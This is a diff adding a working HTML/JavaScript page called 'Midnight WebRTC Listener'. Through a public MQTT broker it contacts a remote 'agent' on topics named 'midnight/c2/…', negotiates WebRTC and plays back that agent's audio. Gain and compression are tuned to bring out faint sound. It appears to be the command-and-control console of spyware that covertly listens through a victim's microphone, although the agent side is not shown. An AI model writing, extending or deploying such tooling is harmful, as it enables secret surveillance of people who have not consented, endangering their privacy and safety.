@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Midnight WebRTC Listener</title>
+    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #1a1a1a;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: #2d2d2d;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 300px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: #404040;
+            color: #fff;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        #btnCall {
+            background: #007acc;
+            color: white;
+        }
+
+        #btnCall:hover {
+            background: #005f99;
+        }
+
+        #btnStop {
+            background: #cc0000;
+            color: white;
+            display: none;
+        }
+
+        #status {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 0.5;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0.5;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h2>🎙️ Midnight Listener</h2>
+        <input type="text" id="agentId" placeholder="Enter Agent ID (from Config)" value="user123">
+        <button id="btnCall">📞 Call Agent</button>
+        <button id="btnStop">🛑 Hang Up</button>
+        <div id="status">Ready to connect...</div>
+        <div id="controls" style="display:none; width: 100%; margin-top: 15px;">
+            <canvas id="visualizer" width="300" height="60"
+                style="background: #000; border-radius: 5px; margin-bottom: 10px; width: 100%;"></canvas>
+            <label for="volumeSlider" style="display:block; text-align:left; font-size:0.8rem; color:#ccc;">Volume
+                Boost: <span id="volVal">100%</span></label>
+            <input type="range" id="volumeSlider" min="1" max="5" step="0.1" value="1" style="width:100%;">
+            <div style="font-size: 0.7rem; color: #666; margin-top: 5px;">*Auto-Gain Enabled</div>
+        </div>
+        <audio id="remoteAudio" autoplay controls style="display: none;"></audio>
+    </div>
+
+    <script>
+        let client;
+        let pc;
+        let topicBase;
+        let audioCtx;
+        let gainNode;
+        let analyser;
+        let drawVisual;
+
+        const btnCall = document.getElementById('btnCall');
+        const btnStop = document.getElementById('btnStop');
+        const status = document.getElementById('status');
+        const remoteAudio = document.getElementById('remoteAudio');
+        const controls = document.getElementById('controls');
+        const volumeSlider = document.getElementById('volumeSlider');
+        const volVal = document.getElementById('volVal');
+        const canvas = document.getElementById('visualizer');
+        const canvasCtx = canvas.getContext('2d');
+
+        // Volume Slider Logic
+        volumeSlider.oninput = () => {
+            const val = parseFloat(volumeSlider.value);
+            if (gainNode) gainNode.gain.value = val;
+            volVal.textContent = Math.round(val * 100) + "%";
+        };
+
+        btnCall.onclick = async () => {
+            const agentId = document.getElementById('agentId').value;
+            if (!agentId) return alert("Enter Agent ID!");
+
+            // Init Audio Context (Must be after user gesture)
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx.state === 'suspended') await audioCtx.resume();
+
+            topicBase = `midnight/c2/${agentId}`;
+            status.textContent = "Connecting to Broker...";
+            status.className = "pulse";
+
+            // 1. Connect MQTT
+            client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt'); // Secure WebSocket
+
+            client.on('connect', () => {
+                status.textContent = "Broker Connected. Calling...";
+                client.subscribe(`${topicBase}/offer`);
+                client.subscribe(`${topicBase}/ice_agent`);
+
+                // Send Request
+                client.publish(`${topicBase}/call`, "start");
+            });
+
+            client.on('message', async (topic, message) => {
+                const payload = message.toString();
+
+                if (topic.endsWith('/offer')) {
+                    status.textContent = "Offer Received. Negotiating...";
+                    await createPeerConnection();
+                    await pc.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: payload }));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+                    client.publish(`${topicBase}/answer`, answer.sdp);
+                }
+                else if (topic.endsWith('/ice_agent')) {
+                    if (pc) {
+                        try {
+                            const candidate = JSON.parse(payload);
+                            await pc.addIceCandidate(candidate);
+                        } catch (e) { console.error(e); }
+                    }
+                }
+            });
+        };
+
+        btnStop.onclick = () => {
+            if (pc) pc.close();
+            if (client) client.end();
+            if (audioCtx) audioCtx.close().then(() => audioCtx = null);
+            cancelAnimationFrame(drawVisual);
+            resetUI();
+        };
+
+        async function createPeerConnection() {
+            pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' },
+                    { urls: 'stun:stun2.l.google.com:19302' }
+                ]
+            });
+
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    client.publish(`${topicBase}/ice`, JSON.stringify(event.candidate));
+                }
+            };
+
+            pc.ontrack = (event) => {
+                status.textContent = "🔊 Audio Streaming...";
+                status.className = "";
+                status.style.color = "#0f0";
+
+                // --- Audio Processing Pipeline ---
+                const stream = event.streams[0];
+                const source = audioCtx.createMediaStreamSource(stream);
+
+                // 1. Auto Gain (Compressor)
+                // Boosts quiet sounds and limits loud ones
+                const compressor = audioCtx.createDynamicsCompressor();
+                compressor.threshold.value = -50;
+                compressor.knee.value = 40;
+                compressor.ratio.value = 12;
+                compressor.attack.value = 0;
+                compressor.release.value = 0.25;
+
+                // 2. Manual Gain (Booster)
+                gainNode = audioCtx.createGain();
+                gainNode.gain.value = parseFloat(volumeSlider.value); // Set initial value
+
+                // 3. Analyser (Visualizer)
+                analyser = audioCtx.createAnalyser();
+                analyser.fftSize = 256; // Precision
+                const bufferLength = analyser.frequencyBinCount;
+                const dataArray = new Uint8Array(bufferLength);
+
+                // Connect: Source -> Compressor -> Gain -> Analyser -> Speakers
+                source.connect(compressor);
+                compressor.connect(gainNode);
+                gainNode.connect(analyser); // Visualize AFTER boost
+                analyser.connect(audioCtx.destination);
+
+                // Start Visualizer Loop
+                const draw = () => {
+                    drawVisual = requestAnimationFrame(draw);
+                    analyser.getByteTimeDomainData(dataArray);
+
+                    canvasCtx.fillStyle = 'rgb(0, 0, 0)';
+                    canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+
+                    canvasCtx.lineWidth = 2;
+                    canvasCtx.strokeStyle = 'rgb(0, 255, 0)'; // Hacker Green
+                    canvasCtx.beginPath();
+
+                    const sliceWidth = canvas.width * 1.0 / bufferLength;
+                    let x = 0;
+
+                    for (let i = 0; i < bufferLength; i++) {
+                        const v = dataArray[i] / 128.0;
+                        const y = v * canvas.height / 2;
+
+                        if (i === 0) canvasCtx.moveTo(x, y);
+                        else canvasCtx.lineTo(x, y);
+
+                        x += sliceWidth;
+                    }
+                    canvasCtx.lineTo(canvas.width, canvas.height / 2);
+                    canvasCtx.stroke();
+                };
+                draw();
+
+                // Dummy audio element to keep stream active in some browsers
+                remoteAudio.srcObject = stream;
+                remoteAudio.muted = true; // We play via WebAudio, mute the element to avoid echo
+
+                controls.style.display = 'block';
+            };
+
+            pc.onconnectionstatechange = () => {
+                if (pc.connectionState === 'disconnected') resetUI();
+            };
+
+            btnCall.style.display = 'none';
+            btnStop.style.display = 'block';
+        }
+
+        function resetUI() {
+            status.textContent = "Disconnected.";
+            status.style.color = "#aaa";
+            status.className = "";
+            btnCall.style.display = 'block';
+            btnStop.style.display = 'none';
+            controls.style.display = 'none';
+            // Clear canvas
+            canvasCtx.fillStyle = 'rgb(0, 0, 0)';
+            canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+            if (gainNode) gainNode = null;
+        }
+
+        // --- Auto-Fill ID from URL query (?id=XXX) ---
+        window.addEventListener('load', () => {
+            const params = new URLSearchParams(window.location.search);
+            const urlId = params.get('id');
+            const agentInput = document.getElementById('agentId');
+
+            if (urlId) {
+                // Auto-fill and lock
+                agentInput.value = urlId;
+                // Optional: Hide input for cleaner look
+                // agentInput.style.display = 'none'; 
+                btnCall.textContent = `📞 Connect to ${urlId}`;
+                btnCall.classList.add('pulse'); // Highlight button
+            }
+        });
+    </script>
+</body>
+
+</html>
